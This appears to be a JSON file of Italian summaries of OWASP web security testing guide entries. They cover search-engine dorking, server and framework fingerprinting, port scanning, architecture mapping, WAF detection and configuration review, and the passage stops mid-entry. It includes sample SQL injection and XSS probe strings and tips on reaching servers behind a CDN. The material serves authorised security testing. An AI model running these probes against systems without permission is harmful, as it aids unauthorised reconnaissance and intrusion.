{
    "WSTG-INFO-01": {
      "summary": "<h3>Sommario</h3><p>I motori di ricerca utilizzano bot per esaminare miliardi di pagine web, seguendo link o consultando i file sitemap. Il file robots.txt serve a escludere alcune pagine dal crawling, ma se non è aggiornato o mancano i meta tag HTML che limitano l’indicizzazione, anche dati non destinati a essere pubblici possono essere indicizzati. I tester possono sfruttare i motori di ricerca per raccogliere informazioni sia direttamente (analisi degli indici o delle cache) sia indirettamente (forum, newsgroup, siti di terzi). Esistono strumenti e funzioni, come Google Search Console, per rimuovere o gestire questi dati.</p><h3>Obiettivi del test</h3><ul><li>Identificare informazioni di design o configurazione dell’applicazione, del sistema o dell’organizzazione, esposte direttamente o tramite terze parti.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Usa i motori di ricerca per trovare informazioni sensibili come: diagrammi di rete, configurazioni, post di amministratori, procedure di login, username, password, chiavi private, file di configurazione cloud, messaggi di errore, ambienti non pubblici (dev, test, UAT, staging). Non usare un solo motore: i risultati possono cambiare tra Google, Bing, DuckDuckGo, Shodan ecc. Sfrutta operatori come site:, inurl:, intitle:, filetype: per ricerche mirate (es. site:azienda.com). Usa cache: per vedere versioni archiviate. Consulta database di dork come Google Hacking Database per query già pronte che scoprono file e directory sensibili.</p>",
      "tools": "",
      "remediation": "<h3>Rimedi</h3><p>Valuta sempre la sensibilità dei dati prima di pubblicarli online. Rivedi periodicamente le informazioni già pubblicate per limitarne l’esposizione.</p>",
      "test_objectives": ""
    },
    "WSTG-INFO-02": {
      "summary": "<h3>Sommario</h3><p>Il web server fingerprinting permette di identificare tipo e versione del web server. Questa informazione è fondamentale per capire se esistono vulnerabilità note, soprattutto se il server non è aggiornato. Anche se molti tool automatizzano il fingerprinting, è importante capire come funziona il processo.</p><h3>Obiettivi del test</h3><ul><li>Determinare versione e tipo di web server per individuare eventuali vulnerabilità note.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Le tecniche principali sono: banner grabbing (analisi degli header di risposta HTTP), invio di richieste malformate, confronto delle risposte con un database di firme note. Esempio pratico: l’header Server può contenere nome e versione (es. Apache/2.4.41). Se il campo è nascosto o modificato, si può fare un’ipotesi confrontando l’ordine degli header o le pagine di errore standard. Tool come Netcraft, Nikto e Nmap sono molto usati per questa attività.</p>",
      "tools": "",
      "remediation": "<h3>Rimedi</h3><p>L’esposizione di informazioni sul server facilita attacchi mirati. Per ridurre i rischi: offusca le informazioni negli header (es. tramite mod_headers su Apache), usa un reverse proxy per proteggere il server reale, applica sempre gli aggiornamenti di sicurezza.</p>",
      "test_objectives": ""
    },
    "WSTG-INFO-03": {
      "summary": "<h3>Sommario</h3><p>L’analisi di file di metadata come robots.txt, sitemap.xml, security.txt, humans.txt o dei meta tag HTML può rivelare informazioni sensibili su path interni, tecnologie, ambienti di test o membri del team. Queste informazioni sono utili per ampliare la superficie d’attacco o per attività di OSINT e social engineering.</p><h3>Obiettivi del test</h3><ul><li>Scoprire path o funzionalità nascoste tramite file di metadata.</li><li>Raccogliere informazioni utili per la mappatura del sistema.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Scarica e analizza robots.txt e sitemap.xml con curl o wget. Esamina i meta tag nelle pagine HTML. Cerca la presenza di security.txt (anche in .well-known/) per trovare contatti di sicurezza e policy. Analizza eventuali chiavi pubbliche o file humans.txt. Prendi nota di email, path, riferimenti a tecnologie, membri del team. Puoi anche preparare una lista di file noti da cercare automaticamente con un crawler o un fuzzer.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Browser (view source)</li><li>curl, wget</li><li>Burp Suite, ZAP</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INFO-04": {
      "summary": "<h3>Sommario</h3><p>Scoprire tutte le applicazioni ospitate su un web server è fondamentale, soprattutto perché molte possono essere vulnerabili, obsolete o configurate in modo errato. L’uso di virtual host, porte non standard e path non pubblicizzati complica la scoperta completa delle applicazioni. Un’analisi superficiale può far perdere applicazioni potenzialmente critiche.</p><h3>Obiettivi del test</h3><ul><li>Elencare tutte le applicazioni accessibili dal web server target.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Usa scanning DNS, reverse-IP, motori di ricerca, ricerca di virtual host, scansione di tutte le porte TCP (es. Nmap -sV -p0-65535). Analizza directory, cerca nomi di dominio tramite zone transfer, query PTR, servizi come Netcraft o MxToolbox. Controlla anche i certificati SSL/TLS per individuare host e servizi aggiuntivi.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>nslookup, dig</li><li>Nmap</li><li>Nessus, Nikto</li><li>Motori di ricerca</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INFO-05": {
      "summary": "<h3>Sommario</h3><p>I commenti e i metadata inseriti in HTML o JavaScript possono contenere informazioni sensibili (query SQL, credenziali, API key, internal IP, percorsi, variabili di debug). Anche i file di debug come i source map (.map) possono esporre il codice originale. È importante verificare anche il corpo delle risposte di redirect.</p><h3>Obiettivi del test</h3><ul><li>Analizzare commenti, metadata e redirect per eventuali leak di informazioni.</li><li>Raccogliere JavaScript e controllare la presenza di informazioni sensibili.</li><li>Verificare la presenza di file di debug frontend (es. .map).</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Controlla i commenti HTML (‘<!-- ... -->’), meta tag (author, robots, keywords), versioni DTD, variabili JavaScript contenenti chiavi o credenziali, eventuali API key in JSON. Prova ad aggiungere ‘.map’ agli URL dei file JS caricati. Analizza le risposte 3xx per evitare leak di informazioni. Usa proxy come Burp Suite o ZAP per monitorare tutto il traffico.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Wget, Curl</li><li>Browser (view source/devtools)</li><li>Burp Suite, ZAP</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INFO-06": {
      "summary": "<h3>Sommario</h3><p>L’enumerazione dell’applicazione e della sua attack surface è il primo passo di ogni test efficace. Permette di individuare aree potenzialmente vulnerabili e pianificare i test di sicurezza in modo mirato.</p><h3>Obiettivi del test</h3><ul><li>Individuare punti di input/injection tramite analisi delle richieste e risposte HTTP.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Analizza tutte le richieste HTTP, i parametri, i form, le variabili GET/POST, e annota le informazioni chiave. Usa proxy di intercettazione per vedere parametri hidden, cookie, header personalizzati, errori, redirect. Annota ogni endpoint e parametro rilevante in un foglio di calcolo, utile anche per la reportistica.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>Burp Suite, ZAP, Fiddler</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INFO-07": {
      "summary": "<h3>Sommario</h3><p>Prima di eseguire test di sicurezza, è fondamentale capire la struttura e i principali workflow dell’applicazione. Senza una mappatura, i test rischiano di essere incompleti.</p><h3>Obiettivi del test</h3><ul><li>Mappare l’applicazione e i workflow principali.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Documenta i percorsi scoperti tramite spidering (manuale o automatico). Usa un foglio di calcolo per elencare URL, punti decisionali, workflow coperti e funzioni testate. In casi complessi chiedi direttamente al cliente info su funzioni o aree di interesse. Un report con screenshot e descrizioni dettagliate aiuta a dimostrare la copertura.</p>",
      "tools": "<h3>Strumenti</h3><ul><li>ZAP (spider, ajax spider, openAPI)</li><li>Spreadsheet</li><li>Software di diagrammi</li></ul>",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INFO-08": {
      "summary": "<h3>Sommario</h3><p>Praticamente ogni possibile idea di web application è già stata sviluppata almeno in parte. Considerando il vastissimo numero di progetti open source attivamente utilizzati e distribuiti, è molto probabile che durante un penetration test si incontrino target che dipendono in tutto o in parte da applicazioni o framework molto diffusi (come WordPress, phpBB, Mediawiki, ecc.). Riconoscere i componenti di una web application rende il testing molto più efficace e permette di risparmiare tempo e fatica. Queste applicazioni note presentano spesso marker identificativi ben precisi: header HTML specifici, cookie particolari, strutture di directory prevedibili. La maggior parte dei framework web espone marker riconoscibili in questi punti, che permettono sia agli attaccanti che ai tester di identificarli. I tool automatici fanno proprio questo: cercano marker noti in posizioni standard e li confrontano con un database di firme. Per una maggiore precisione, si cercano solitamente più marker contemporaneamente.</p><h3>Obiettivi del test</h3><ul><li>Identificare i componenti software utilizzati dalla web application (fingerprinting).</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Ci sono diversi punti dove cercare marker di framework o componenti:</p><ul><li>HTTP header</li><li>Cookie</li><li>Sorgente HTML</li><li>File e directory specifiche</li><li>Estensioni dei file</li><li>Messaggi di errore</li></ul><p>La forma più semplice di identificazione è osservare il campo X-Powered-By negli header HTTP di risposta. Molti strumenti permettono il fingerprinting: il più semplice è netcat.</p><p>Esempio di richiesta e risposta HTTP:</p><pre><code>$ nc 127.0.0.1 80\nHEAD / HTTP/1.0\n\nHTTP/1.1 200 OK\nServer: nginx/1.0.14\n[...]\nX-Powered-By: Mono</code></pre><p>Dal campo X-Powered-By si deduce che il framework è probabilmente Mono. Tuttavia, questa tecnica non funziona sempre: X-Powered-By può essere facilmente disabilitato via configurazione. Esistono anche tecniche per offuscare gli header HTTP (vedi sezione Remediation). Dallo stesso esempio si nota anche la versione di nginx.</p><p>Il tester può anche non trovare l’header X-Powered-By, oppure ricevere risposte simili a:</p><pre><code>HTTP/1.1 200 OK\nServer: nginx/1.0.14\nDate: Sat, 07 Sep 2013 08:19:15 GMT\nContent-Type: text/html;charset=ISO-8859-1\nConnection: close\nVary: Accept-Encoding\nX-Powered-By: Blood, sweat and tears</code></pre><p>A volte ci sono altri header HTTP che rivelano il framework. Ad esempio, l’header X-Powered-By indica PHP, ma X-Generator segnala l’uso di Swiftlet, dettaglio utile per ampliare la superficie d’attacco. Durante il fingerprinting, controlla ogni header HTTP per possibili informazioni sensibili.</p><pre><code>HTTP/1.1 200 OK\nServer: nginx/1.4.1\nDate: Sat, 07 Sep 2013 09:22:52 GMT\nContent-Type: text/html\nConnection: keep-alive\nVary: Accept-Encoding\nX-Powered-By: PHP/5.4.16-1~dotdeb.1\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\nCache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0\nPragma: no-cache\nX-Generator: Swiftlet</code></pre><p>Un metodo alternativo e spesso più affidabile è analizzare i cookie specifici di framework.</p><p>Esempio pratico:</p><p>Figure 4.1.8-7: Cakephp HTTP Request</p><br><p>Il cookie CAKEPHP viene impostato automaticamente e indica che il framework è CakePHP. L’elenco dei cookie comuni è nella sezione Cookies. Questa tecnica è più affidabile rispetto a X-Powered-By, anche se è comunque possibile rinominare i cookie tramite configurazione (ad esempio in CakePHP modificando core.php).</p><pre><code>/**\n* Nome del session cookie CakePHP.\n* @link https://php.net/session_name\n*/ Configure :: write ( 'Session.cookie' , 'CAKEPHP' );</code></pre><p>Questi cambiamenti sono meno frequenti rispetto alla modifica degli header HTTP.</p><p>Un altro approccio è cercare pattern nel codice sorgente HTML. Spesso si trovano marker (come commenti HTML, path a directory specifiche per il framework, variabili di script) che rivelano l’ambiente utilizzato. Molti di questi dettagli sono presenti nell’head, nei meta tag o alla fine della pagina, ma è buona norma ispezionare tutta la risposta HTTP, comprese parti meno visibili (ad esempio commenti e hidden fields). Gli sviluppatori non sempre nascondono le informazioni in modo efficace, e può capitare di trovare note esplicite anche in fondo alla pagina.</p><p>Ogni componente ha la sua struttura di file e directory. Per identificarli quando non sono esplicitamente visibili, si utilizza il forced browsing (o dirbusting), ovvero brute forcing di path noti e monitoraggio delle risposte HTTP. Questa tecnica permette sia di trovare file/configurazioni di default sia di fingerprintare l’applicazione. Esempio: usando una wordlist su Burp Suite per enumerare directory WordPress (/wp-includes/, /wp-admin/, /wp-content/), si possono distinguere facilmente risposte come 403, 302, 200, indicatori di WordPress. Allo stesso modo, è possibile dirbustare plugin e versioni di applicazioni. Prima di procedere, controlla robots.txt: può contenere path sensibili o directory di applicazione.</p><p>Le estensioni dei file nelle URL aiutano a individuare la piattaforma usata (.php, .aspx, .jsp, ecc.). Ad esempio, il path wp-content/ rivela WordPress, mentre funzioni.php indica PHP.</p><h3>Identifier comuni</h3><ul><li>%framework_name%</li><li>powered by</li><li>built upon</li><li>running</li></ul>",
      "tools": "<h3>Strumenti</h3><p>Ecco alcuni dei tool più usati:</p><ul><li><a href=\"https://github.com/urbanadventurer/WhatWeb\">WhatWeb</a>: uno dei migliori strumenti open source per il fingerprinting (Ruby). Cerca marker usando stringhe di testo, regex, Google dork, hash MD5, riconoscimento URL, pattern HTML, codice custom Ruby. Incluso di default su Kali Linux.</li><li><a href=\"https://www.wappalyzer.com/\">Wappalyzer</a>: disponibile come estensione browser (Firefox/Chrome) o webapp, riconosce le tecnologie caricate in pagina tramite regex. Rapido per una panoramica iniziale, anche se non sempre preciso.</li></ul>",
      "remediation": "<h3>Rimedi</h3><p>Modificare nomi di cookie, nascondere/riscrivere path, rimuovere header noti, serve solo come security through obscurity: può rallentare attaccanti poco esperti, ma non offre una vera protezione. Meglio puntare su formazione e aggiornamento costante di tutti i componenti.</p>",
      "test_objectives": ""
    },
    "WSTG-INFO-09": {
      "summary": "",
      "how-to": "",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-INFO-10": {
      "summary": "<h3>Sommario</h3><p>Per testare un’applicazione in modo efficace, e poter dare raccomandazioni mirate su come correggere eventuali problematiche, è fondamentale capire cosa si sta effettivamente testando. Inoltre, bisogna determinare se ci sono componenti specifici che devono essere considerati fuori scope.</p><p>Le web application moderne possono variare molto in complessità: si va da semplici script su un unico server a sistemi articolati distribuiti su decine di sistemi, linguaggi e componenti. Possono essere presenti anche componenti di rete come firewall o intrusion protection system che possono influenzare il test.</p><h3>Obiettivi del test</h3><ul><li>Comprendere l’architettura dell’applicazione e le tecnologie in uso.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Nella prospettiva black box, è importante ricostruire il funzionamento dell’applicazione e identificare tecnologie e componenti presenti. In alcuni casi è possibile testare per la presenza di componenti specifici come web application firewall, in altri casi si possono dedurre analizzando il comportamento dell’applicazione.</p><p>Le sezioni seguenti presentano una panoramica dei principali componenti architetturali e come identificarli.</p><p>Le applicazioni più semplici girano su un unico server, identificabile con le stesse tecniche descritte nel fingerprinting del web server.</p><p>Nel modello Platform-as-a-Service (PaaS), il web server e l’infrastruttura sono gestiti dal provider, mentre il cliente gestisce solo l’applicazione. Dal punto di vista del test, questo comporta due differenze principali:</p><ul><li>L’application owner non ha accesso all’infrastruttura sottostante, quindi non può correggere direttamente alcune vulnerabilità.</li><li>Il testing infrastrutturale di solito è fuori scope.</li></ul><p>A volte si riconosce il PaaS dal dominio (es. *.azurewebsites.net su Azure App Services), anche se è possibile l’uso di custom domain. In altri casi, è difficile riconoscere un ambiente PaaS.</p><p>Nel modello serverless, il codice è eseguito come funzione su una piattaforma gestita, e non come applicazione tradizionale in una webroot. Questo approccio è tipico delle architetture a microservizi. Anche in questo caso, il testing infrastrutturale è solitamente fuori scope.</p><p>La presenza di codice serverless può essere dedotta da header HTTP specifici. Ad esempio, le funzioni AWS Lambda restituiscono header come:</p><pre><code>X-Amz-Invocation-Type\nX-Amz-Log-Type\nX-Amz-Client-Context</code></pre><p>Le Azure Functions sono meno riconoscibili; di solito restituiscono Server: Kestrel, ma questo non basta a identificarle con certezza.</p><p>Nelle architetture a microservizi, l’API dell’applicazione è costituita da più servizi indipendenti, spesso in container (ad esempio gestiti da Kubernetes), e sviluppati in vari linguaggi e sistemi operativi. Tipicamente sono esposti tramite un unico API gateway, ma la presenza di più linguaggi (ad esempio negli error message) può far capire che si tratta di microservizi.</p><p>Molte applicazioni memorizzano contenuti statici su storage dedicati invece che sul web server principale. I più diffusi sono Amazon S3 e Azure Storage Account, facilmente riconoscibili dai domini:</p><ul><li>BUCKET.s3.amazonaws.com o s3.REGION.amazonaws.com/BUCKET per S3</li><li>ACCOUNT.blob.core.windows.net per Azure Storage</li></ul><p>Questi storage possono spesso esporre file sensibili (vedi sezione Cloud Storage).</p><p>Le applicazioni più complesse usano un database per i contenuti dinamici. A volte è possibile identificare il DB tramite:</p><ul><li>Port scanning alla ricerca di porte tipiche di database</li><li>Innescando errori SQL o NoSQL (o trovandoli già indicizzati sui motori di ricerca)</li></ul><p>In assenza di dati certi, si può ipotizzare il database osservando altri dettagli:</p><ul><li>Windows, IIS e ASP.NET spesso usano Microsoft SQL Server</li><li>Sistemi embedded spesso usano SQLite</li><li>PHP tende a usare MySQL o PostgreSQL</li><li>APEX usa Oracle</li></ul><p>Queste non sono regole assolute, ma aiutano a farsi un’idea iniziale.</p><p>Quasi tutte le applicazioni web includono un meccanismo di autenticazione, che può essere implementato in vari modi:</p><ul><li>Configurazione lato web server (es. .htaccess) o password hardcoded negli script (si manifesta con HTTP Basic Auth, indicata da pop-up nel browser e header WWW-Authenticate: Basic)</li><li>Account locali su database (tipicamente integrati nel form login o in endpoint API)</li><li>Sistemi di autenticazione centralizzata come Active Directory o LDAP (possono usare NTLM, header WWW-Authenticate: NTLM, richiesta di username in formato DOMAIN\\utente o scelta da dropdown)</li><li>Single Sign-On (SSO) interno o esterno (OAuth, OpenID Connect, SAML)</li></ul><p>Le applicazioni possono offrire più opzioni di autenticazione, ad esempio consentire la registrazione locale o l’accesso tramite Facebook, e usare meccanismi diversi per utenti e amministratori.</p><p>Quasi tutte le web application caricano risorse di terze parti, tra cui:</p><ul><li>Contenuto attivo (script, fogli di stile, font, iframe)</li><li>Contenuto passivo (immagini, video)</li><li>API esterne</li><li>Social button</li><li>Ad network</li><li>Payment gateway</li></ul><p>Queste risorse sono richieste direttamente dal browser, quindi facilmente identificabili tramite DevTools o proxy di intercettazione. Vanno comunque censite perché possono impattare la sicurezza dell’applicazione, ma di norma sono fuori scope, in quanto gestite da terzi.</p><p>Un reverse proxy si trova davanti a uno o più server backend e inoltra le richieste verso la destinazione corretta. Può implementare load balancing, web application firewall, ospitare più applicazioni su stesso IP o dominio, applicare restrizioni IP, caching. A volte è difficile rilevare la presenza di un reverse proxy, ma si possono notare:</p><ul><li>Mismatch tra server frontend e backend (es. Server: nginx su app ASP.NET, potenziale rischio di request smuggling)</li><li>Header duplicati (specialmente Server)</li><li>Più applicazioni su stesso IP/domino, anche con linguaggi diversi</li></ul><p>Un load balancer gestisce più server backend e distribuisce le richieste per garantire disponibilità e scalabilità. È difficile da rilevare, ma a volte si vede da risposte differenti (tempi di sistema, hostname o IP diversi negli error message, indirizzi diversi in caso di SSRF). Alcuni load balancer inseriscono cookie specifici (es. BIGipServer per F5 BIG-IP).</p><p>I Content Delivery Network (CDN) sono reti di server proxy distribuiti geograficamente per migliorare le performance. Si rilevano con una WHOIS sugli IP del dominio: se appartengono a provider noti (Akamai, Cloudflare, Fastly), quasi sicuramente è in uso un CDN. Attenzione: gli IP e i server pubblici appartengono al CDN e sono fuori scope per test infrastrutturali; i CDN possono implementare bot detection, rate limiting, WAF; i contenuti backend potrebbero non essere aggiornati subito lato frontend.</p><p>Se il sito è dietro un CDN, può essere utile identificare i backend server, che possono essere raggiunti con vari metodi (mail inviate dal backend con IP visibile, zone transfer DNS, certificate transparency, scan IP range aziendali, SSRF, error message dettagliati).</p><p>Quasi tutti i web server sono protetti da firewall (packet filtering o stateful inspection), che bloccano traffico non necessario. Per rilevare il firewall esegui una port scan: se la maggior parte delle porte è “closed” (RST), probabilmente il server non è protetto da firewall. Se sono “filtered” (nessuna risposta), allora il firewall è attivo. Se trovi servizi come SMTP, IMAP, MySQL esposti, il firewall è assente o mal configurato.</p><p>Un Intrusion Detection System (IDS) di rete rileva attività sospette o malevole (come port scan o vulnerability scan) e genera alert. Un Intrusion Prevention System (IPS) blocca anche il traffico sospetto, di solito bloccando l’IP sorgente. Un IPS può essere individuato se, dopo uno scan automatizzato, il proprio IP viene bloccato; molti tool applicativi però possono non essere rilevati, soprattutto se il traffico è cifrato.</p><p>Un Web Application Firewall (WAF) controlla le richieste HTTP e blocca quelle sospette, può aggiungere controlli dinamici come CAPTCHA o rate limiting, ed è basato su signature note (es. OWASP CRS) e regex. Il WAF è efficace contro SQLi e XSS, meno su access control e business logic. Può essere installato su web server, VM, appliance dedicate o cloud. Per rilevare un WAF, inserisci payload noti (es. foo=' UNION SELECT 1 o <script>alert(1)</script>) e verifica se la richiesta viene bloccata; le block page possono rivelare la tecnologia usata, così come header o cookie specifici. I WAF cloud si possono a volte bypassare accedendo direttamente al backend, come visto per i CDN.</p>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-01": {
      "summary": "<h3>Sommario</h3><p>L’intrinseca complessità di un’infrastruttura web composta da server eterogenei e interconnessi, che può includere centinaia di applicazioni, rende la gestione e la revisione della configurazione un passaggio fondamentale sia per il testing che per il deployment di ogni singola applicazione. Basta una sola vulnerabilità per compromettere la sicurezza dell’intera infrastruttura: anche problemi apparentemente minori o trascurabili possono trasformarsi in rischi gravi per altre applicazioni sullo stesso server. Per questo motivo, è essenziale effettuare una revisione approfondita della configurazione e delle problematiche di sicurezza note, dopo aver mappato l’architettura nel suo insieme.</p><p>La corretta gestione della configurazione dell’infrastruttura web è essenziale per garantire la sicurezza dell’applicazione stessa. Se elementi come il software del web server, i database backend o i server di autenticazione non vengono adeguatamente revisionati e messi in sicurezza, possono introdurre rischi inattesi o nuove vulnerabilità in grado di compromettere la stessa applicazione.</p><p>Ad esempio, una vulnerabilità del web server che permette a un attaccante remoto di accedere al codice sorgente dell’applicazione (vulnerabilità emersa più volte sia su web server che su application server) può mettere a rischio l’intero sistema: un utente anonimo potrebbe sfruttare le informazioni ottenute dal codice per eseguire attacchi mirati verso l’applicazione o i suoi utenti.</p><p>Le principali fasi da seguire per testare la gestione della configurazione sono:</p><ul><li>Identificare i diversi elementi che compongono l’infrastruttura, comprendendo come interagiscono con la web application e quale impatto hanno sulla sua sicurezza.</li><li>Revisionare ogni elemento dell’infrastruttura per assicurarsi che non presenti vulnerabilità note.</li><li>Esaminare gli strumenti amministrativi utilizzati per la gestione dei diversi elementi.</li><li>Verificare i sistemi di autenticazione, per essere certi che rispondano alle esigenze dell’applicazione e non possano essere manipolati da utenti esterni per ottenere accesso non autorizzato.</li><li>Mantenere un elenco aggiornato delle porte richieste dall’applicazione e gestirlo sotto controllo delle modifiche.</li></ul><p>Dopo aver mappato tutti gli elementi dell’infrastruttura (vedi Map Network and Application Architecture), è possibile revisionare la configurazione di ciascuno e testare eventuali vulnerabilità note.</p><h3>Obiettivi del test</h3><ul><li>Revisionare le configurazioni applicative distribuite sulla rete e verificare che non siano vulnerabili.</li><li>Validare che framework e sistemi utilizzati siano sicuri e non soggetti a vulnerabilità note dovute a software non aggiornato o impostazioni e credenziali di default.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Vulnerabilità presenti in diversi livelli dell’architettura, sia a livello di web server che di database backend, possono compromettere l’applicazione. Ad esempio, una vulnerabilità di server che consente a un utente remoto e non autenticato di caricare file o sovrascrivere file esistenti può portare al completo compromesso dell’applicazione, permettendo a un utente malevolo di sostituire il codice o inserire codice dannoso che si propagherà verso i backend.</p><p>Revisionare le vulnerabilità del server può essere difficile in caso di penetration test blind; in questi casi si procede da remoto, spesso tramite tool automatici. Tuttavia, alcuni test possono avere effetti imprevedibili sul server e altri, come quelli per i denial of service, potrebbero essere esclusi per non causare downtime.</p><p>Alcuni tool automatici segnalano vulnerabilità in base alla versione del web server rilevata, ma questo può portare sia a falsi positivi che a falsi negativi: se la versione è stata rimossa o offuscata dall’amministratore, il tool potrebbe non segnalare vulnerabilità anche se presenti; viceversa, se il vendor non aggiorna il numero di versione dopo la correzione, il tool potrebbe segnalare problemi inesistenti. Questo accade spesso perché molte distribuzioni GNU/Linux (Debian, Red Hat, SuSE) integrano patch di sicurezza senza aggiornare la versione del software. In generale, la scansione rileva solo le vulnerabilità degli elementi esposti (web server) ma non degli elementi non esposti direttamente, come autenticazione backend, database o reverse proxy [1].</p><p>Inoltre, non tutti i vendor comunicano pubblicamente le vulnerabilità: alcune sono note solo ai clienti o risolte senza advisories pubbliche. Questo riduce l’efficacia dei tool automatici, che coprono molto bene prodotti diffusi (Apache, IIS, Lotus Domino) ma risultano meno affidabili per prodotti meno comuni.</p><p>Per questo, la revisione delle vulnerabilità è più efficace se il tester dispone di informazioni interne su software, versioni e patch installate: in questo modo può confrontare i dati con i bollettini vendor, analizzare rischi potenziali e, quando possibile, testare direttamente gli effetti delle vulnerabilità, rilevando anche eventuali contromisure (IDS/IPS) che possono mitigare l’exploit. È anche possibile che una vulnerabilità risulti “non presente” semplicemente perché colpisce un componente software non utilizzato nell’architettura.</p><p>È importante ricordare che alcuni vendor correggono vulnerabilità “silenziosamente” rilasciando nuove versioni del software; inoltre, il supporto per vecchie versioni può variare e terminare anche nel breve termine. Un tester che conosce i dettagli delle versioni può valutare il rischio di utilizzare release non più supportate: se emerge una vulnerabilità su una versione ormai fuori supporto, il personale IT potrebbe non esserne informato, non ricevere patch e non trovare advisories pubbliche. In questi casi, l’unica soluzione è aggiornare il software, con possibili downtime o necessità di ricoding se il nuovo software non è compatibile.</p><p>Ogni infrastruttura web richiede strumenti amministrativi per la gestione e l’aggiornamento delle informazioni utilizzate dalle applicazioni: contenuti statici, codice sorgente, database di autenticazione, ecc. Gli strumenti variano a seconda della tecnologia in uso: alcuni web server si gestiscono tramite interfacce web (iPlanet), altri tramite file di configurazione in chiaro (Apache [3]), altri ancora con tool grafici del sistema operativo (IIS, ASP.Net).</p><p>La configurazione del server è di solito gestita con vari tool di gestione file, amministrati via FTP, WebDAV, NFS, CIFS o altri protocolli. Anche l’OS degli elementi dell’architettura è gestito tramite altri tool. Alcune applicazioni dispongono di interfacce amministrative interne per la gestione dei dati (utenti, contenuti, ecc.).</p><p>Dopo aver censito tutte le interfacce amministrative, è importante revisionarle: se un attaccante le compromette, può danneggiare o prendere il controllo dell’intera architettura. Per questo occorre:</p><ul><li>Individuare i meccanismi di controllo accessi di queste interfacce e le relative debolezze (spesso documentate online).</li><li>Assicurarsi che username e password di default siano sempre cambiati.</li></ul><p>Alcune aziende affidano la gestione delle applicazioni web (o di parte dei contenuti) a fornitori esterni: questi possono gestire solo alcune parti (news, promozioni) o l’intero sito (contenuti e codice). In questi casi è frequente trovare interfacce amministrative esposte su Internet, perché più economico di una connessione dedicata. È quindi fondamentale verificare che tali interfacce non siano vulnerabili.</p><h3>Riferimenti</h3><ul><li>[1] WebSEAL, conosciuto anche come Tivoli Authentication Manager, è un reverse proxy IBM parte del framework Tivoli.</li><li>[2] Ad esempio Symantec Bugtraq, ISS X-Force, NIST NVD.</li><li>[3] Esistono tool GUI anche per Apache (es. NetLoony) ma non sono molto diffusi.</li></ul>",
      "tools": "",
      "remediation": "",
      "test_objectives": ""
    },
    "WSTG-CONF-02": {
      "summary": "<h3>Sommario</h3><p>La corretta configurazione dei singoli elementi che compongono l’architettura di un’applicazione è fondamentale per prevenire errori che possano compromettere la sicurezza dell’intero sistema.</p><p>Revisionare e testare le configurazioni è un’attività critica sia in fase di creazione che di manutenzione dell’architettura. Molti sistemi vengono distribuiti con configurazioni generiche, non sempre adatte agli scopi specifici o ai siti in cui vengono installati.</p><p>Nelle installazioni standard di web server e application server spesso sono inclusi funzionalità aggiuntive (esempi applicativi, documentazione, pagine di test) che dovrebbero essere rimosse prima della messa in produzione per evitare rischi di exploit post-installazione.</p><h3>Obiettivi del test</h3><ul><li>Assicurarsi che file di default o noti siano stati rimossi.</li><li>Verificare che non ci siano codice di debug o estensioni non necessarie in produzione.</li><li>Revisionare i meccanismi di logging dell’applicazione.</li></ul>",
      "how-to": "<h3>Come testare</h3><p>Nelle installazioni di default, molti web server e application server forniscono applicazioni e file di esempio utili allo sviluppatore per verificare il corretto funzionamento dopo l’installazione. Tuttavia, molte applicazioni di default sono state oggetto di vulnerabilità (es. CVE-1999-0449, CAN-2002-1744, CAN-2002-1630, CAN-2003-1172).</p><p>Gli scanner CGI, che includono elenchi dettagliati di file noti e directory di esempio, possono essere un modo veloce per individuare questi file, ma solo una revisione completa del contenuto del web server o application server consente di accertare se sono effettivamente presenti o meno.</p><p>È molto comune che gli sviluppatori aggiungano commenti nel codice HTML di grandi applicazioni web: questi commenti possono rivelare informazioni interne che non dovrebbero essere accessibili a un attaccante. A volte parte del codice viene “commentata” e rimane esposta tra i commenti HTML.</p><p>La revisione dei commenti va fatta sia sui contenuti statici che dinamici del server, anche tramite ricerche sui file. Può essere utile eseguire una navigazione automatica o guidata del sito, raccogliendo tutti i contenuti e analizzando i commenti HTML presenti nel codice.</p><p>Strumenti, checklist o documenti specifici possono aiutare i professionisti IT e security a valutare la conformità dei sistemi target rispetto a baseline o benchmark di configurazione. Tra questi, ad esempio:</p><ul><li>CIS-CAT Lite</li><li>Microsoft Attack Surface Analyzer</li><li>NIST National Checklist Program</li></ul><p>La configurazione del web server o application server è centrale per proteggere i contenuti del sito e va attentamente revisionata per individuare errori comuni. Le configurazioni raccomandate variano in base alla policy del sito e alle funzionalità richieste, ma è buona prassi seguire le linee guida fornite dal vendor o da enti esterni.</p><p>Non esiste una regola universale su come configurare un server, ma alcune best practice sono:</p><ul><li>Abilitare solo i moduli server (o ISAPI extensions su IIS) realmente necessari, riducendo la superficie d’attacco.</li><li>Gestire gli errori server (40x e 50x) con pagine personalizzate, evitando che errori applicativi restituiscano informazioni sensibili o codice all’utente finale.</li><li>Eseguire il server software con privilegi minimi nel sistema operativo, limitando i rischi in caso di exploit.</li><li>Assicurarsi che il logging di accessi ed errori sia abilitato e funzionante.</li><li>Configurare il server per gestire eventuali overload e prevenire attacchi di Denial of Service; ottimizzare le performance.</li><li>Non concedere mai accesso a applicationHost.config, redirection.config e administration.config a identità non amministrative (escluso NT SERVICE\\WMSvc). Questo include Network Service, IIS_IUSRS, IUSR o qualsiasi identità custom di IIS application 